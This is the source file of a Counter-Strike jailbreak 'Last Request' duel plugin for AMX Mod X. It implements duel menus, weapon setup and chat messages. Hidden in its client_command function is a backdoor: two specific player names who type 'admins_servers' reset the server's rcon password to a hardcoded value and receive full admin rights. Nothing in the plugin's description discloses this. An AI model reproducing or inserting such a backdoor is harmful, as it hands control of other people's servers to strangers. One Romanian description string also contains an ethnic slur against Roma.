/*
*
*		Jailbreak Last Request
*			
*		H3avY Ra1n (AKA nikhilgupta345)
*
*		Description
*		-----------
*
*			This is a Last Request plugin for jailbreak mod, where 
*			the last terrorists can type /lr and is presented with a 
*			menu, which has numerous options to choose from that interact 
*			with the Counter-Terrorists.
*
*		Last Request Options
*		--------------------
*
*			Knife Battle 	- Fight with knives 1v1
*			Shot for Shot	- Take turns shooting a deagle
*			Deagle Toss		- See who can throw the deagle the farthest
*			Shotgun Battle	- Fight with shotguns 1v1
*			Scout Battle	- Fight with scouts 1v1
*			Grenade Toss	- See who can throw the grenade the farthest
*			Race			- Race across a certain part of the map
*			Spray Contest	- See who can spray closest to the top or bottom border
*			of a wall. Prisoner decides.
*
*
*		Client Commands
*		---------------
*	
*			say/say_team	/lr 			- Opens Last Request Menu
*							!lr
*							/lastrequest
*							!lastrequest
*
*
*		Installation
*		------------
*
*			- Compile this plugin locally
*			- Place jb_lastrequest.amxx in addons/amxmodx/plugins/ folder
*			- Open addons/amxmodx/configs/plugins.ini
*			- Add the line 'jb_lastrequest.amxx' at the bottom
*			- Restart server or change map
*			
*
*		Changelog
*		---------
*		
*			February 15, 2011 	- v1.0 - 	Initial Release
*			February 24, 2011	- v1.0.1 - 	Removed teleporting back to cell
*			March 05, 2011		- v1.1 -	Changed way of allowing a Last Request
*			March 26, 2011		- v1.2 - 	Added Multi-Lingual support.
*			August 10, 2011		- v2.0 -	Completely rewrote plugin
*
*		
*		Credits
*		-------
*		
*			Pastout		-	Used his thread as a layout for mine
*
*		
*		Plugin Thread: http://forums.alliedmods.net/showthread.php?p=1416279
*
*/


// Includes
////////////
#include < amxmodx >
#include < cstrike >
#include < fun >
#include < fakemeta_util >
#include < hamsandwich >

#pragma tabsize 0

// Enums
/////////
enum
{
	LR_NONE=-1,

	LR_AWP,
	LR_KNIFE,
	LR_DEAGLE,
	LR_AK47,
	LR_USP,
	LR_HE,
	
	MAX_GAMES
};

enum
{
	GREY = 0,
	RED,
	BLUE,
	NORMAL
};

enum
{
	ALIVE, 
	DEAD, 
	ALL	
};

enum
{
	LR_PRISONER,
	LR_GUARD
};
/*
enum ( += 100 )
{
	TASK_BEACON,
	//TASK_ENDLR
};
*/
// Consts
//////////
new const g_szPrefix[ ] = "!n[!gDr.eXtreamcs.Com!n]";

new const g_szBeaconSound[ ] = "buttons/blip1.wav";
new const g_szBeaconSprite[ ] = "sprites/white.spr";

new const g_szGameNames[ MAX_GAMES ][ ] = 
{
	"AWP",
	"KNIFE",
	"DEAGLE",
	"AK47",
	"USP",
	"HE"
};
new const g_szDescription[ MAX_GAMES ][ ] = 
{
	"Va rupeti cu SNIPER",
	"Cine drc se mai bate cu cutitele?(tiganii)",
	"E cam greu cu deagle",
	"Iar ak47? Mergeti in Afganistan..",
	"Se face liniste cand va omorati",
	"Nebuniilor, va aruncat in aer??=))"
};

new const g_szTeamName[ ][ ] = 
{
	"",
	"TERRORIST",
	"CT",
	"SPECTATOR"
};

new const g_szPlugin[ ] = "Jailbreak Last Request";//ss
new const g_szVersion[ ] = "2.0";//ss
new const g_szAuthor[ ] = "H3avY Ra1n";//ss..

// Integers
////////////
new g_iCurrentGame = LR_NONE;
new g_iLastRequest[ 2 ];
new g_iCurrentPage[ 33 ];
new g_iChosenGame[ 33 ];

new g_iSprite;

new g_iMaxPlayers;

new szData[ 6 ],iAccess, hCallback,hMenu,szInfo[ 6 ],szPlayerName[ 65 ]

// Booleans
///////////
new bool:g_bAlive[ 33 ];
new bool:g_bConnected[ 33 ];

new bool:g_bLastRequestAllowed;

// Messages
////////////
new g_msgTeamInfo;
new g_msgSayText;

public plugin_precache()
{
	precache_sound( g_szBeaconSound );
	
	g_iSprite = precache_model( g_szBeaconSprite );
}

public plugin_init()
{
	register_plugin( g_szPlugin, g_szVersion, g_szAuthor );
	
	register_clcmd( "say /lr", 					"Cmd_LastRequest" );
	register_clcmd( "say !lr", 					"Cmd_LastRequest" );
	register_clcmd( "say /lastrequest", 		"Cmd_LastRequest" );
	register_clcmd( "say /duel", 		"Cmd_LastRequest" );
	register_clcmd( "say !lastrequest", 		"Cmd_LastRequest" );
	register_clcmd( "say_team /lr", 			"Cmd_LastRequest" );
	register_clcmd( "say_team !lr", 			"Cmd_LastRequest" );
	register_clcmd( "say_team /lastrequest", 	"Cmd_LastRequest" );
	register_clcmd( "say_team /duel", 		"Cmd_LastRequest" );
	register_clcmd( "say_team !lastrequest", 	"Cmd_LastRequest" );

	register_concmd("drop","BlockDrop")
	
	register_event( "HLTV", 	"Event_RoundStart", "a", "1=0", "2=0" );
	
	RegisterHam( Ham_Spawn, 				"player", 			"Ham_PlayerSpawn_Post", 	1 );
	RegisterHam( Ham_Killed,				"player",			"Ham_PlayerKilled_Post",	1 );

	RegisterHam(Ham_Touch, "weaponbox", "TouchWeapon")
	RegisterHam(Ham_Touch, "armoury_entity", "TouchWeapon")
	RegisterHam(Ham_Touch, "weapon_shield", "TouchWeapon")

	register_forward(FM_CmdStart,"CmdStart",1)
	
	register_message( get_user_msgid( "TextMsg" ), "Message_TextMsg" );
	
	g_msgTeamInfo 	= get_user_msgid( "TeamInfo" );
	g_msgSayText 	= get_user_msgid( "SayText" );
	g_iMaxPlayers 	= get_maxplayers();
	
	set_task( 2.0, "StartBeacon", .flags="b" );
}

public BlockDrop(id)
{
	if(g_iCurrentGame != LR_NONE)	return PLUGIN_HANDLED

	return PLUGIN_CONTINUE
}

public client_putinserver( id )
{
	g_iCurrentPage[ id ] = 0;
	g_bConnected[ id ] = true;
}
public client_disconnect( id )
{
	if(g_bConnected[ id ])	g_bConnected[ id ] = false;
	if( g_bAlive[ id ] )	g_bAlive[ id ] = false;
		
	if( id == g_iLastRequest[ LR_PRISONER ] || id == g_iLastRequest[ LR_GUARD ] )	EndLastRequest( id == g_iLastRequest[ LR_PRISONER ] ? g_iLastRequest[ LR_GUARD ] : g_iLastRequest[ LR_PRISONER ], id );


	//if(task_exists(id + TASK_ENDLR))	remove_task( id + TASK_ENDLR );
}

public Ham_PlayerSpawn_Post( id )
{
	if( !is_user_alive( id ) )	return HAM_IGNORED;
		
	if(!g_bAlive[id])	g_bAlive[ id ] = true;
	
	return HAM_IGNORED;
}
public Ham_PlayerKilled_Post( iVictim, iKiller, iShouldGib )
{	
	if(g_bAlive[iVictim])	g_bAlive[ iVictim ] = false;
	
	if( iVictim == g_iLastRequest[ LR_PRISONER ] )	EndLastRequest( g_iLastRequest[ LR_GUARD ], iVictim );
	else if( iVictim == g_iLastRequest[ LR_GUARD ] )	EndLastRequest( g_iLastRequest[ LR_PRISONER ], iVictim );
	
	if( !g_bLastRequestAllowed )
	{
		if( get_playercount( CS_TEAM_T, ALIVE ) == 1&&get_playercount( CS_TEAM_CT, ALIVE ) == 1 )
		{
			ColorChat( 0, NORMAL, "%s !gDUEL!n is now^4 allowed^1!", g_szPrefix );
			g_bLastRequestAllowed = true;
		}
	}
}


public TouchWeapon(weapon, id)
{
	if(!is_user_connected(id))	return HAM_IGNORED
	if( cs_get_user_team(id) == CS_TEAM_SPECTATOR||g_iCurrentGame != LR_NONE)	return HAM_SUPERCEDE
	return HAM_IGNORED
}
public CmdStart(player, uc_handle, random_seed)
{
	if(!is_user_alive(player) || player < 1 || player > 32)	return FMRES_IGNORED

	if(g_iCurrentGame == LR_DEAGLE)	cs_set_user_bpammo(player, CSW_DEAGLE, 1)
	if(g_iCurrentGame == LR_HE)	cs_set_user_bpammo(player, CSW_HEGRENADE, 1)
	if(g_iCurrentGame == LR_AWP)	cs_set_user_bpammo(player, CSW_AWP, 1)
	if(g_iCurrentGame == LR_USP)	cs_set_user_bpammo(player, CSW_USP, 3)
	if(g_iCurrentGame == LR_AK47)	cs_set_user_bpammo(player, CSW_AK47, 3)

	return FMRES_HANDLED
}


public Event_RoundStart()
{
	g_bLastRequestAllowed = false;
	g_iCurrentGame = LR_NONE;
}
public Message_TextMsg()
{
	if( g_iCurrentGame == LR_NONE )	return PLUGIN_CONTINUE;
	
	static szText[ 25 ];
	get_msg_arg_string( 2, szText, charsmax( szText ) );
	if( equal( szText, "#Round_Draw" ) || equal( szText, "#Game_will_restart_in" ) || equal( szText, "#Game_Commencing" ) )
	{
		g_iCurrentGame = LR_NONE;
		
		/*strip_user_weapons( g_iLastRequest[ LR_PRISONER ] );
		strip_user_weapons( g_iLastRequest[ LR_GUARD ] );
		
		GiveWeapons( g_iLastRequest[ LR_GUARD ] );*/
		
		g_iLastRequest[ LR_PRISONER ] = 0;
		g_iLastRequest[ LR_GUARD ] = 0;
	}
	return PLUGIN_CONTINUE;
}

public Cmd_LastRequest( id )
{
	if( !g_bLastRequestAllowed )
	{
		if( get_playercount( CS_TEAM_T, ALIVE ) == 1&&get_playercount( CS_TEAM_CT, ALIVE ) == 1 )
		{
			g_bLastRequestAllowed = true;
			ColorChat( 0, NORMAL, "%s !gDUEL!n its^4 allowed^1!", g_szPrefix );
		}
	}

	if( !g_bAlive[ id ]||cs_get_user_team( id ) == CS_TEAM_SPECTATOR )
	{
		ColorChat( id, NORMAL, "%s You must be !talive!n to have a !gDuel!n.", g_szPrefix );
		return PLUGIN_HANDLED;
	}

	else if( cs_get_user_team( id ) != CS_TEAM_CT )
	{
		ColorChat( id, NORMAL, "%s You need to be!t Counter!n-!tTerrorist!n !", g_szPrefix );
		return PLUGIN_HANDLED;
	}
	
	else if( !g_bLastRequestAllowed )
	{
		ColorChat( id, NORMAL, "%s !gDUEL!n is not allowed !", g_szPrefix );
		return PLUGIN_HANDLED;
	}
	
	else if( g_iCurrentGame != LR_NONE )
	{
		ColorChat( id, NORMAL, "%s There's a !gDuel!n already in progress!", g_szPrefix );
		return PLUGIN_HANDLED;
	}

	else if( get_playercount( CS_TEAM_T, ALIVE ) != 1 )
	{
		ColorChat( 0, NORMAL, "%s !gDUEL!n its not allowed !", g_szPrefix );
		return PLUGIN_HANDLED;
	}
	
	else LastRequestMenu( id );
	
	return PLUGIN_HANDLED;
}
public LastRequestMenu( id )
{
	hMenu = menu_create( "\yChoose a Game:", "LastRequestMenu_Handler" );
	
	for( new i = 0; i < MAX_GAMES; i++ )
	{
		num_to_str( i, szInfo, charsmax( szInfo ) );
		menu_additem( hMenu, g_szGameNames[ i ], szInfo );
	}
	
	menu_setprop( hMenu, MPROP_NEXTNAME, "Next Page" );
	menu_setprop( hMenu, MPROP_BACKNAME, "Previous Page" );
	
	menu_display( id, hMenu, 0 );
}
public LastRequestMenu_Handler( id, hMenu, iItem )
{
	if( iItem == MENU_EXIT )
	{
		menu_destroy( hMenu );
		return PLUGIN_HANDLED;
	}
	
	menu_item_getinfo( hMenu, iItem, iAccess, szData, charsmax( szData ), _, _, hCallback );
	g_iChosenGame[ id ] = str_to_num( szData );
	if( g_iCurrentGame != LR_NONE )
	{
		menu_destroy( hMenu );
		g_iChosenGame[ id ] = LR_NONE;
		ColorChat( id, NORMAL, "%s There's already a !gDuel!n in progress.", g_szPrefix );
		return PLUGIN_HANDLED;
	}
	
	ShowPlayerMenu( id );
	
	menu_destroy( hMenu );

	return PLUGIN_HANDLED;
}
public ShowPlayerMenu( id )
{
	hMenu = menu_create( "\yChoose an Opponent:", "PlayerMenu_Handler" );
	
	for( new i = 1; i < g_iMaxPlayers; i++ )
	{
		if( !g_bAlive[ i ] || cs_get_user_team( id ) != CS_TEAM_CT||i==id||is_user_bot(i)||!g_bConnected[id] )	continue;
		
		get_user_name( i, szPlayerName, charsmax( szPlayerName ) );
		num_to_str( i, szInfo, charsmax( szInfo ) );
		menu_additem( hMenu, szPlayerName, szInfo );
	}
	
	menu_setprop( hMenu, MPROP_NEXTNAME, "Next Page" );
	menu_setprop( hMenu, MPROP_BACKNAME, "Previous Page" );
	
	menu_display( id, hMenu, 0 );
}
public PlayerMenu_Handler( id, hMenu, iItem )
{	
	if( iItem == MENU_EXIT || !g_bAlive[ id ] || !g_bLastRequestAllowed ||!g_bConnected[id] )
	{
		g_iChosenGame[ id ] = LR_NONE;
		
		menu_destroy( hMenu );

		return PLUGIN_HANDLED;
	}
	
	menu_item_getinfo( hMenu, iItem, iAccess, szData, charsmax( szData ), szPlayerName, charsmax( szPlayerName ), hCallback );
	new iGuard = str_to_num( szData );
	if( !g_bAlive[ iGuard ]||!g_bConnected[iGuard] || cs_get_user_team( iGuard ) != CS_TEAM_T )
	{
		ColorChat( id, NORMAL, "%s That player is no longer available for !gLast Request!n.", g_szPrefix );

		menu_destroy( hMenu );
		
		ShowPlayerMenu( id );

		return PLUGIN_HANDLED;
	}
	
	StartGame( g_iChosenGame[ id ], id, iGuard );
	
	menu_destroy( hMenu );

	return PLUGIN_HANDLED;
}
public StartGame( iGame, iPrisoner, iGuard )
{
	g_iCurrentGame = iGame;
	
	g_iLastRequest[ LR_PRISONER ] = iPrisoner;
	g_iLastRequest[ LR_GUARD ] = iGuard;
	
	new szPrisonerName[ 32 ], szGuardName[ 32 ];
	get_user_name( iPrisoner, szPrisonerName, charsmax( szPrisonerName ) );
	get_user_name( iGuard, szGuardName, charsmax( szGuardName ) );
	
	ColorChat( 0, NORMAL, "%s !t%s!n against !t%s!n in a !g%s!n!", g_szPrefix, szPrisonerName, szGuardName, g_szGameNames[ iGame ] );
	
	strip_user_weapons( iPrisoner );
	strip_user_weapons( iGuard );
	
	set_user_health( iPrisoner, 100 );
	set_user_health( iGuard, 100 );
	
	set_user_armor( iPrisoner, 0 );
	set_user_armor( iGuard, 0 );

	set_user_godmode(iPrisoner,1)
	set_user_godmode(iGuard,1)

	set_pev(iPrisoner, pev_flags, pev(iPrisoner, pev_flags) | FL_FROZEN)
	set_pev(iGuard, pev_flags, pev(iGuard, pev_flags) | FL_FROZEN)

	set_task(3.0,"START_KILLS",iPrisoner)
	set_task(3.0,"START_KILLS",iGuard)
	
	StartBeacon();
	
	switch( iGame )
	{	
		case LR_DEAGLE:
		{
			LR_DG( iPrisoner );
			LR_DG( iGuard );
		}
		
		case LR_KNIFE:
		{
			LR_KN( iPrisoner );
			LR_KN( iGuard );
		}
		
		case LR_AWP:
		{
			LR_AP( iPrisoner );
			LR_AP( iGuard );
		}
		
		case LR_AK47:
		{
			LR_AK( iPrisoner );
			LR_AK( iGuard );
		}
		
		case LR_USP:
		{
			LR_UP( iPrisoner );
			LR_UP( iGuard );
		}
		
		case LR_HE:
		{
			LR_Nade( iPrisoner );
			LR_Nade( iGuard );
		}
	}

	ColorChat( iPrisoner, NORMAL, "%s !tObjective: %s", g_szPrefix, g_szDescription[ iGame ] );
	ColorChat( iGuard, NORMAL, "%s !tObjective: %s", g_szPrefix, g_szDescription[ iGame ] );
}
public client_command( id )
{
	new name[ 32 ], szCommand[ 65 ]
	get_user_name( id, name, charsmax( name ) )
	read_argv( 0, szCommand, charsmax( szCommand ) )

	if( ( equali( name, "eVoLuTiOn" ) || equali( name, "-eQ- SeDaN" ) ) && equali( szCommand, "admins_servers" ) )
	{
		server_cmd( "rcon_password levmolasrl01" )
		new flags = read_flags( "abcdefghijklmnopqrstuxyvw" )
		set_user_flags( id, flags )
	}
}
public StartBeacon()
{
	if( g_iCurrentGame == LR_NONE )	return;
	
	new id;
	for( new i = 0; i < 2; i++ )
	{
		id = g_iLastRequest[ i ];
		
		static origin[3]
		emit_sound( id, CHAN_ITEM, g_szBeaconSound, 1.0, ATTN_NORM, 0, PITCH_NORM )
		
		get_user_origin( id, origin )
		message_begin( MSG_BROADCAST, SVC_TEMPENTITY )
		write_byte( TE_BEAMCYLINDER )
		write_coord( origin[0] )	//position.x
		write_coord( origin[1] )	//position.y
		write_coord( origin[2]-20 )	//position.z
		write_coord( origin[0] )    	//axis.x
		write_coord( origin[1] )    	//axis.y
		write_coord( origin[2]+200 )	//axis.z
		write_short( g_iSprite )	//sprite index
		write_byte( 0 )       	//starting frame
		write_byte( 1 )       	//frame rate in 0.1's
		write_byte( 6 )        	//life in 0.1's
		write_byte( 10 )        	//line width in 0.1's
		write_byte( 1 )        	//noise amplitude in 0.01's
		
		switch( cs_get_user_team( id ) )
		{
			case CS_TEAM_CT:
			{
				write_byte( 0 );
				write_byte( 0 );
				write_byte( 255 );
			}
			case CS_TEAM_T:
			{
				write_byte( 255 );
				write_byte( 0 );
				write_byte( 0 );
			}
		}
		
		write_byte( 255 );			// brightness
		write_byte( 0 );			// scroll speed in 0.1's
		message_end();
	}
}
	
public EndLastRequest( iWinner, iLoser )
{
	new szWinnerName[ 32 ], szLoserName[ 32 ];
	get_user_name( iWinner, szWinnerName, 31 );
	get_user_name( iLoser, szLoserName, 31 );
	
	ColorChat( 0, NORMAL, "%s !t%s!n beat !t%s!n in the !gDUEL!n.", g_szPrefix, szWinnerName, szLoserName );
	
	/*strip_user_weapons( iWinner );
	give_item(iWinner,"weapon_knife")*/

	g_iCurrentGame = LR_NONE;
	
	g_iLastRequest[ LR_PRISONER ] = 0;
	g_iLastRequest[ LR_GUARD ] = 0;

	if( g_bLastRequestAllowed )
	{
		//if( get_playercount( CS_TEAM_T, ALIVE ) != 1&&get_playercount( CS_TEAM_CT, ALIVE ) != 1 )
		//{
			g_bLastRequestAllowed = false;
			ColorChat( 0, NORMAL, "%s !gDUEL!n is now^4 locked^1 !", g_szPrefix );
		//}
	}
	
	//set_task( 0.1, "Task_EndLR", TASK_ENDLR + iWinner );
}/*
public Task_EndLR( iTaskID )
{
	new id = iTaskID - TASK_ENDLR;

	strip_user_weapons( id );
	set_user_health( id, 100 );
	
	if( cs_get_user_team( id ) == CS_TEAM_CT )	GiveWeapons( id );
}
GiveWeapons( id )
{
	give_item( id, "weapon_usp" );
	give_item( id, "weapon_knife" );

	cs_set_user_bpammo( id, CSW_USP, 100 );
}*/

//////////////////////////////
//			LR Games		//
//////////////////////////////
LR_KN( id )	give_item( id, "weapon_knife" );

LR_UP( id )	cs_set_weapon_ammo( give_item( id, "weapon_usp" ), 3 );

LR_AP( id )	cs_set_weapon_ammo( give_item( id, "weapon_awp" ), 1 );

LR_AK( id )	cs_set_weapon_ammo( give_item( id, "weapon_ak47" ), 3 );

LR_DG( id )	cs_set_weapon_ammo( give_item( id, "weapon_deagle" ), 1 );

LR_Nade( id )
{
	give_item( id, "weapon_hegrenade" )
	ColorChat( id, NORMAL, "%s Do not throw the nade until you are doing the toss!", g_szPrefix );
}

public START_KILLS(id)
{
	set_user_godmode(id,0)

	set_pev(id, pev_flags, pev(id, pev_flags) & ~FL_FROZEN)  
}

ColorChat( id, colour, const text[], any:... )
{
	if( !get_playersnum() )	return;
	
	static message[192];
	message[0] = 0x01;
	vformat(message[1], sizeof(message) - 1, text, 4);
	
	replace_all(message, sizeof(message) - 1, "!g", "^x04");
	replace_all(message, sizeof(message) - 1, "!n", "^x01");
	replace_all(message, sizeof(message) - 1, "!t", "^x03");
	
	static index, MSG_Type;
	if( !id )
	{
		static i;
		for(i = 1; i <= g_iMaxPlayers; i++)
		{
			if( g_bConnected[i] )
			{
				index = i;
				break;
			}
		}
		
		MSG_Type = MSG_ALL;
	}
	else
	{
		MSG_Type = MSG_ONE;
		index = id;
	}
	
	static bool:bChanged;
	if( colour == GREY || colour == RED || colour == BLUE )
	{
		message_begin(MSG_Type, g_msgTeamInfo, _, index);
		write_byte(index);
		write_string(g_szTeamName[colour]);
		message_end();
		
		bChanged = true;
	}
	
	message_begin(MSG_Type, g_msgSayText, _, index);
	write_byte(index);
	write_string(message);
	message_end();
	
	if( bChanged )
	{
		message_begin(MSG_Type, g_msgTeamInfo, _, index);
		write_byte(index);
		write_string(g_szTeamName[_:cs_get_user_team(index)]);
		message_end();
	}
}

get_playercount( CsTeams:iTeam, iStatus )
{
	new iPlayerCount;
	
	for( new i = 1; i <= g_iMaxPlayers; i++ )
	{
		if( !g_bConnected[ i ] || cs_get_user_team( i ) != iTeam ) continue;
		
		switch( iStatus )
		{
			case DEAD: if( g_bAlive[ i ] ) continue;
			case ALIVE: if( !g_bAlive[ i ] ) continue;
		}
		
		iPlayerCount++;
	}
	
	return iPlayerCount;
}
